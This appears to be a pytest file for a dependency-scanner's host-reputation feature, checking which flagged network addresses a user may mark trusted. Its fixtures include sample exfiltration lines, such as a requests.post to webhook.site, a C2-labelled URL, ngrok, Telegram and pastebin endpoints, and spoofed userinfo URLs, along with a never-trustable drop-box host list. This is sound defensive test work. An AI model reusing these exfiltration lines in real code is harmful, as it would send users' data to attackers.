"""Host reputation, scanner side: the shipped list of well-known services (a name for a
host, never a verdict) and the addresses a finding carries so the user can mark them
trusted in the panel (tests/test_trust.py). User decisions 2026-11-12."""

import pytest

from sniff_test import known
from sniff_test.analyzers import endpoints, guarddog, python_deps
from sniff_test.deps.uv import Artifact
from sniff_test.models import Severity, Tag
from sniff_test.report import explain

PKG = python_deps.ResolvedPackage("vector-client", "1.5.3", {"x86_64", "aarch64"})
ART = Artifact("https://x", "vector_client-1.5.3-py3-none-any.whl", None, "wheel")
RULE = "threat-network-exfiltration"


def _hit(code, match, loc="vectors/embed/remote_embedding.py:13"):
    return {"location": loc, "code": code, "match": match, "message": "m"}


# GuardDog 3.2's real output for a dependency of a real integration (names changed)
TOGETHER = _hit('ENDPOINT = "https://api.together.xyz/v1/embeddings"', "https://api.together.xyz/")


def _findings(*hits):
    return guarddog.to_findings({"results": {RULE: list(hits)}}, PKG, ART)


def test_lookup_matches_the_host_or_a_subdomain_only():
    svc = known.lookup("api.together.xyz")
    assert svc and svc.name == "Together AI" and svc.label == "Together AI, AI model API"
    assert known.lookup("API.Together.XYZ.") == svc
    assert known.lookup("eu.api.together.xyz") == svc
    assert known.lookup("together.xyz") is None  # the entry is the API host, not the domain
    assert known.lookup("evilapi.together.xyz") is None
    assert known.lookup("api.together.xyz.evil.tk") is None
    assert known.lookup("") is None and known.lookup(None) is None
    assert known.lookup("myres.openai.azure.com").shared


def test_no_listed_service_is_a_place_where_anyone_can_receive_data():
    """The list may never overlap the classes that mean "drop box or someone's own
    server" (in either direction: a listed suffix under one of theirs, or one of theirs
    under a listed suffix)."""
    risky = [(c, s) for c, s in endpoints.host_classes()
             if c in ("exfil_service", "messaging", "developer_hosted", "analytics")]  # fmt: skip
    for svc in known.services():
        for cls, suffix in risky:
            assert not (svc.suffix == suffix or svc.suffix.endswith("." + suffix)), (svc, cls)
            assert not suffix.endswith("." + svc.suffix), (svc, cls, suffix)
        assert svc.name and svc.what and "." in svc.suffix and " " not in svc.suffix
        assert not svc.suffix.startswith(("http", "*", "."))
    assert len({s.suffix for s in known.services()}) == len(known.services())
    # nothing as wide as a whole cloud or a public suffix
    assert not {s.suffix for s in known.services()} & {
        "amazonaws.com", "googleapis.com", "azure.com", "cloudflare.com", "github.io",
        "google.com", "microsoft.com", "windows.net", "xyz", "com",
    }  # fmt: skip


def test_a_real_hit_on_a_known_service_stays_high_and_carries_its_address():
    """0.8.0 lowered this by itself from the list; the user chose to decide per address
    (0.9.0). The finding is as it was, plus the address the panel can offer to trust."""
    [f] = _findings(TOGETHER)
    assert f.rule_id == "dep-guarddog-network-exfiltration"
    assert f.severity is Severity.HIGH and Tag.POSSIBLE in f.tags
    assert f.addresses == ("api.together.xyz",)
    assert f.evidence.endswith("https://api.together.xyz/")
    assert "dep-guarddog-network-exfiltration-known-service" not in explain.RULES
    # the rule's plain title no longer claims a data flow the heuristic can't see
    assert "sends it out" not in explain.explain(f.rule_id).title


def test_several_addresses_are_all_listed_and_an_ip_counts():
    [f] = _findings(
        TOGETHER,
        _hit('C2 = "https://cdn-update.top/x"', "https://cdn-update.top/", "a.py:2"),
        _hit('U = "http://203.0.113.9/up"', "http://203.0.113.9", "a.py:3"),
    )
    assert f.addresses == ("api.together.xyz", "cdn-update.top", "203.0.113.9")
    # a second URL on the same line that GuardDog didn't report is counted too
    [g] = _findings(
        _hit('A = ["https://api.together.xyz/v1", "https://other.example.org/up"]',
             "https://api.together.xyz/")
    )  # fmt: skip
    assert g.addresses == ("api.together.xyz", "other.example.org")
    # the address is the one a client would connect to
    [h] = _findings(_hit('U = "https://api.together.xyz.evil.tk/"',
                         "https://api.together.xyz.evil.tk/"))  # fmt: skip
    assert h.addresses == ("api.together.xyz.evil.tk",)


@pytest.mark.parametrize(
    "hits",
    [
        # userinfo: who the client reaches is too easy to misread, so no button at all
        [_hit('U = "https://api.together.xyz@evil.tk/"', "https://api.together.xyz@evil.tk/")],
        [_hit('U = "https://api.together.xyz:443@evil.example/"', "https://api.together.xyz:")],
        [_hit('U = "https://user@api.together.xyz/"', "https://user@api.together.xyz/")],
        # a backslash some clients read as a slash
        [_hit('U = "https://evil.tk\\@api.together.xyz/"', "https://evil.tk")],
        # drop boxes and chat webhooks: never trustable, as a bare name or as a URL
        [_hit('requests.post("https://webhook.site/abc", data=d)', "webhook.site")],
        [_hit('requests.post("https://webhook.site/abc", data=d)', "https://webhook.site/")],
        [_hit('U = "https://x.ngrok.io/in"', "https://x.ngrok.io/")],
        [_hit('U = "https://api.telegram.org/bot1/send"', "https://api.telegram.org/")],
        [_hit('U = "https://webhook.cool/x"', "https://webhook.cool/")],
        [TOGETHER, _hit('P = "https://pastebin.com/raw/x"', "https://pastebin.com/", "b.py:1")],
        # no code line to check, or the match isn't in it
        [{"location": "a.py:1", "match": "https://api.together.xyz/"}],
        [_hit("ENDPOINT = BASE", "https://api.together.xyz/")],
        # GuardDog's cap of 5 hits: more matches may exist that it didn't print
        [TOGETHER] * 5,
    ],
)
def test_anything_unclear_gets_no_addresses_so_it_can_never_be_trusted(hits):
    [f] = _findings(*hits)
    assert f.rule_id == "dep-guarddog-network-exfiltration"
    assert f.severity is Severity.HIGH and f.addresses == ()


def test_only_the_two_address_rules_ever_carry_addresses():
    for rule, sev in guarddog.SEVERITY.items():
        if sev is None:
            continue
        [f] = guarddog.to_findings({"results": {rule: [TOGETHER]}}, PKG, ART)
        wanted = rule in ("threat-network-exfiltration", "threat-network-outbound-shady-links")
        assert bool(f.addresses) == wanted, rule


def test_a_known_host_in_the_apps_own_code_gets_a_name_and_keeps_its_class(tmp_path):
    from test_endpoints import _target, _write  # the endpoint tests' own helpers

    root = _write(
        tmp_path / "acme_weather",
        "api.py",
        'A = "https://api.openai.com/v1/chat"\nB = "https://collect.unrelated-vendor.com/x"\n',
    )
    res = endpoints.run(_target(root))
    by = {f.key: f.attrs for f in res.facts if f.kind == "host"}
    assert by["api.openai.com"]["service"] == "OpenAI, AI model API"
    assert by["api.openai.com"]["class"] == "undeclared"  # a name, not a verdict
    assert "service" not in by["collect.unrelated-vendor.com"]
    assert res.findings == []


def test_a_hardcoded_public_ip_carries_its_address_and_a_drop_box_never_does(tmp_path):
    from test_endpoints import _target, _write

    root = _write(
        tmp_path / "acme_weather",
        "api.py",
        'A = "http://93.184.215.14:8080/push"\nB = "https://webhook.site/abc"\n',
    )
    by = {f.rule_id: f for f in endpoints.run(_target(root)).findings}
    assert by["endpoint-public-ip-literal"].addresses == ("93.184.215.14",)
    assert by["endpoint-exfil-host"].addresses == ()
    assert endpoints.never_trustable("x.webhook.site") and endpoints.never_trustable("ply.gg")
    assert not endpoints.never_trustable("api.together.xyz")
